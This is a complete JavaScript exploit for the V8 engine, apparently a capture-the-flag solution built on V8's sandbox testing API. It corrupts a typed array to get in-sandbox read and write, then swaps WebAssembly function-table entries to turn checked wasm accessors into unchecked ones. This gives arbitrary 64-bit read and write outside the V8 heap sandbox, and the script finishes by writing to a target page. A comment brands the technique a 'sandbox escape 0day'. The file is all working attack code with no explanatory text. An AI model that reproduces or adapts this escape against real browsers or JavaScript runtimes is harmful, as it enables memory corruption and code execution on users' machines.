let hex=(val) => '0x'+val.toString(16);

function gc() {
    for (let i=0;i<0x10;i++) new ArrayBuffer(0x1000000);
}

function js_heap_defragment() {
    gc();
    for (let i=0;i<0x1000;i++) new ArrayBuffer(0x10);
    for (let i=0;i<0x1000;i++) new Uint32Array(1);
}

__buf=new ArrayBuffer(8);
__f64_buf=new Float64Array(__buf);
__u32_buf=new Uint32Array(__buf);

function ftoi(val) {
    __f64_buf[0]=val;
    return BigInt(__u32_buf[0])+(BigInt(__u32_buf[1]) << 32n);
}

function itof(val) {
    __u32_buf[0]=Number(val & 0xffffffffn);
    __u32_buf[1]=Number(val >> 32n);
    return __f64_buf[0];
}

function assert(x) {
	console.assert(x);
}

var u32array = new Uint32Array([1.1, 2.2, 3.3]);
var memory = new DataView(new Sandbox.MemoryView(0, 0x100000000))
var target_page = Sandbox.targetPage;
print("target_page @ " + hex(target_page));

/***************************** build addrof primitive *****************************/
function addrof(obj)
{
	return Sandbox.getAddressOf(obj);
}

/**************************** build the arb read/write primitive inside the sandbox *****************************/
var arr_addr = addrof(u32array);

// set data_ptr to the start of the sandbox
memory.setUint32(arr_addr + 0x30, 0, true);
memory.setUint32(arr_addr + 0x38, 0, true);

// set length & byte length
memory.setUint32(arr_addr + 0x24, 0xfffffffe, true);
memory.setUint32(arr_addr + 0x2c, 0xfffffffe, true);

function sb_read4(offset) {
	assert(offset % 4 == 0);
	return u32array[offset/4];
}

function sb_write4(offset, val)
{
	assert(offset % 4 == 0);
	u32array[offset/4] = val;
}

var js_heap_base = BigInt(sb_read4(0x4c)) << 32n;
print("js_heap_base @ " + hex(js_heap_base));


/***************************** build the arb read/write primitive outside the sandbox *****************************/
// sandbox escape 0day!!!!!
// init wasm_instance
var wasm_code = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x15, 0x04, 0x60,
  0x02, 0x7e, 0x7e, 0x00, 0x60, 0x01, 0x7e, 0x01, 0x7e, 0x60, 0x02, 0x7f,
  0x7e, 0x00, 0x60, 0x01, 0x7f, 0x01, 0x7e, 0x03, 0x05, 0x04, 0x00, 0x01,
  0x02, 0x03, 0x05, 0x03, 0x01, 0x00, 0x01, 0x07, 0x2d, 0x04, 0x09, 0x6f,
  0x6f, 0x62, 0x5f, 0x77, 0x72, 0x69, 0x74, 0x65, 0x00, 0x00, 0x08, 0x6f,
  0x6f, 0x62, 0x5f, 0x72, 0x65, 0x61, 0x64, 0x00, 0x01, 0x08, 0x64, 0x6f,
  0x5f, 0x77, 0x72, 0x69, 0x74, 0x65, 0x00, 0x02, 0x07, 0x64, 0x6f, 0x5f,
  0x72, 0x65, 0x61, 0x64, 0x00, 0x03, 0x0a, 0x1c, 0x04, 0x03, 0x00, 0x01,
  0x0b, 0x04, 0x00, 0x42, 0x00, 0x0b, 0x09, 0x00, 0x20, 0x00, 0x20, 0x01,
  0x37, 0x03, 0x00, 0x0b, 0x07, 0x00, 0x20, 0x00, 0x29, 0x03, 0x00, 0x0b
]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var {oob_read, oob_write, do_read, do_write} = wasm_instance.exports;

// initialize the functions
oob_read(0n);
oob_write(0n, 0n);
do_read(0);
do_write(0, 0n);

function get_func_ref(func)
{
    var func_addr = addrof(func);
    print("func_addr: " + hex(func_addr));
    var shared_info_addr = sb_read4(func_addr + 0x10)-1;
    print("shared_addr: " + hex(shared_info_addr));
    var function_data_addr = sb_read4(shared_info_addr + 0x8)-1;
    print("function_data: " + hex(function_data_addr));
    var func_ref = sb_read4(function_data_addr + 0x8)-1 ;
    print("func_ref: " + hex(func_ref));
	return func_ref;
}

function func_copy_impl(dst, src)
{
    var src_func_ref = get_func_ref(src);
    var dst_func_ref = get_func_ref(dst);

    var idx = sb_read4(src_func_ref+0x4);
    sb_write4(dst_func_ref+0x4, idx);
}

func_copy_impl(oob_read, do_read);
func_copy_impl(oob_write, do_write);

function read64(addr)
{
    var offset = addr - (js_heap_base + 0x380000000n);
    return oob_read(offset);
}

function write64(addr, val)
{
    return oob_write(addr - (js_heap_base + 0x380000000n), val);
}

write64(BigInt(target_page), 0x4242424242424242n);
